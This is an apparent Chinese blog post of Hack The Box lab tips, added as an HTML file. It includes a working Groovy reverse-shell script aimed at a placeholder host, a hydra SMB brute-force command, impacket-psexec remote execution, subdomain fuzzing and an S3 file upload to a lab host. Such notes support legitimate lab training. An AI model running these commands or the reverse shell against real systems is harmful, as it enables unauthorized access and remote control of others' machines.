@@ -1,0 +1,594 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  htb-trick | L
+</title>
+<meta name="description" content="少女祈祷中..."/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://test692618.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" /><meta property="og:type" content="website" />
+  <meta property="og:title" content="htb-trick | L" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="https://test692618.github.io/post/htb-trick/htb-trick/" />
+  <meta
+    property="og:site_name"
+    content="HELLO WORLD"
+  />
+  <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
+  <meta property="article:author" content="L" />
+  <meta property="article:published_time" content="2026-03-22T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-03-22T00:00:00&#43;00:00" /><meta property="article:tag" content="htb" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.8f5255d5a41db9f4c8349667e7ec6b3d8fb79b7dcc6304fe7d40a5b566fa224f.css" /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" aria-selected="false" >English</li><li data-value="ja" role="option" aria-selected="false" >日本語</li><li data-value="zh-cn" role="option" class="selected" aria-selected="true" >简体中文</li><li data-value="zh-tw" role="option" aria-selected="false" >繁體中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="htb-trick"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">htb-trick</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          
+          class="sidebar-right"  ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#ttl值判断操作系统">TTL值判断操作系统</a></li>
+      </ul>
+    </li>
+    <li><a href="#smbclient使用注意">smbclient使用注意</a></li>
+    <li><a href="#redis基础命令">redis基础命令</a></li>
+    <li><a href="#字典推荐">字典推荐</a></li>
+    <li><a href="#groovy反弹shell脚本">Groovy反弹shell脚本</a></li>
+    <li><a href="#hydra扫描时smb兼容性问题">hydra扫描时smb兼容性问题</a></li>
+    <li><a href="#impact-psexec工具使用">impact-psexec工具使用</a></li>
+    <li><a href="#使用fuzz进行域名爆破">使用fuzz进行域名爆破</a></li>
+    <li><a href="#亚马逊云存储管理工具使用">亚马逊云存储管理工具使用</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">76</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      16
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2026-03-22 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2026-03-22</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2026-03-22</time
+    >
+  </span></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h3 id="ttl值判断操作系统">
+<a class="header-anchor" href="#ttl%e5%80%bc%e5%88%a4%e6%96%ad%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"></a>
+TTL值判断操作系统
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">对比TTL值与操作系统默认值
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">不同操作系统的默认TTL值如下：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Windows: 默认TTL为128
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Linux/Unix: 默认TTL为64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">macOS: 默认TTL为64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">网络设备（如路由器）: 通常为255 
+</span></span></code></pre></div><h2 id="smbclient使用注意">
+<a class="header-anchor" href="#smbclient%e4%bd%bf%e7%94%a8%e6%b3%a8%e6%84%8f"></a>
+smbclient使用注意
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">smbclient -L X.X.X.X  -U [USER] 列出主机目录
+</span></span><span class="line"><span class="cl">smbclient  &#39;\\\\X.X.X.X\\Dir&#39;  -U [USER]  进入目录	
+</span></span></code></pre></div><h2 id="redis基础命令">
+<a class="header-anchor" href="#redis%e5%9f%ba%e7%a1%80%e5%91%bd%e4%bb%a4"></a>
+redis基础命令
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">redis  
+</span></span><span class="line"><span class="cl">	info   详情
+</span></span><span class="line"><span class="cl">	select 0-15  选择库
+</span></span><span class="line"><span class="cl">	keys *    查询键
+</span></span><span class="line"><span class="cl">	get key    查询键值
+</span></span></code></pre></div><h2 id="字典推荐">
+<a class="header-anchor" href="#%e5%ad%97%e5%85%b8%e6%8e%a8%e8%8d%90"></a>
+字典推荐
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sudo apt install seclists -y  # 包含大量字典
+</span></span></code></pre></div><h2 id="groovy反弹shell脚本">
+<a class="header-anchor" href="#groovy%e5%8f%8d%e5%bc%b9shell%e8%84%9a%e6%9c%ac"></a>
+Groovy反弹shell脚本
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-groovy" data-lang="groovy"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;XXXX&#34;</span><span class="o">;</span> <span class="c1">// 反弹主机ip
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="n">XX</span><span class="o">;</span> <span class="c1">// 反弹端口
+</span></span></span><span class="line"><span class="cl"><span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s2">&#34;cmd.exe&#34;</span><span class="o">;</span>   <span class="c1">//windows: cmd.exe   linux : /bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span><span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span></code></pre></div><h2 id="hydra扫描时smb兼容性问题">
+<a class="header-anchor" href="#hydra%e6%89%ab%e6%8f%8f%e6%97%b6smb%e5%85%bc%e5%ae%b9%e6%80%a7%e9%97%ae%e9%a2%98"></a>
+hydra扫描时smb兼容性问题
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb2://X.X.X.X    //由于协议不匹配导致无法枚举，可使用smb2
+</span></span></code></pre></div><h2 id="impact-psexec工具使用">
+<a class="header-anchor" href="#impact-psexec%e5%b7%a5%e5%85%b7%e4%bd%bf%e7%94%a8"></a>
+impact-psexec工具使用
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-psexec administrator@X.X.X.X  
+</span></span><span class="line"><span class="cl">// Psexec通过在远程系统的ADMIN$共享上上传一个随机命名的可执行文件来创建一个远程服务，然后将其注册为Windows服务。以此产生一个交互式shell，通过TCP端口445在远程Windows系统上执行。Psexec要求具有本地管理员或更高权限的用户的凭据（可以读取/写入ADMIN$ ），验证成功后，将获取一个 NT AUTHORITY<span class="se">\S</span>YSTEM shell
+</span></span></code></pre></div><h2 id="使用fuzz进行域名爆破">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8fuzz%e8%bf%9b%e8%a1%8c%e5%9f%9f%e5%90%8d%e7%88%86%e7%a0%b4"></a>
+使用fuzz进行域名爆破
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -u https://FUZZ.target.com <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -H <span class="s2">&#34;Host: FUZZ.target.com&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -t <span class="m">100</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -ac <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -o subs.txt
+</span></span></code></pre></div><h2 id="亚马逊云存储管理工具使用">
+<a class="header-anchor" href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e4%ba%91%e5%ad%98%e5%82%a8%e7%ae%a1%e7%90%86%e5%b7%a5%e5%85%b7%e4%bd%bf%e7%94%a8"></a>
+亚马逊云存储管理工具使用
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws s3 --endpoint<span class="o">=</span>http://s3.thetoppers.htb cp test.php s3://thetoppers.htb  upload: ./test.php to s3://thetoppers.htb/test.php
+</span></span></code></pre></div></div>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/htb-tricks"
+      data-aos="zoom-in"
+      >HTB-tricks</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/htb"
+        rel="tag"
+        >htb</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="安卓逆向"
+              class="lazyload"
+            /><a
+          href="/post/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"
+          aria-label="前一篇:安卓逆向"
+          title="前一篇:安卓逆向"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">安卓逆向</h3>
+      </div></nav></article></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep rotate"></span>L
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp;Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;73.5k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:07</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#ttl值判断操作系统">TTL值判断操作系统</a></li>
+      </ul>
+    </li>
+    <li><a href="#smbclient使用注意">smbclient使用注意</a></li>
+    <li><a href="#redis基础命令">redis基础命令</a></li>
+    <li><a href="#字典推荐">字典推荐</a></li>
+    <li><a href="#groovy反弹shell脚本">Groovy反弹shell脚本</a></li>
+    <li><a href="#hydra扫描时smb兼容性问题">hydra扫描时smb兼容性问题</a></li>
+    <li><a href="#impact-psexec工具使用">impact-psexec工具使用</a></li>
+    <li><a href="#使用fuzz进行域名爆破">使用fuzz进行域名爆破</a></li>
+    <li><a href="#亚马逊云存储管理工具使用">亚马逊云存储管理工具使用</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">76</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      16
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous"  ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous"  ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax ></script><script>
+  var setupFirework = () => {
+    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+      if (window.firework) {
+        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+        options.excludeElements = options.excludeelements;
+        delete options.excludeelements;
+        window.firework(options);
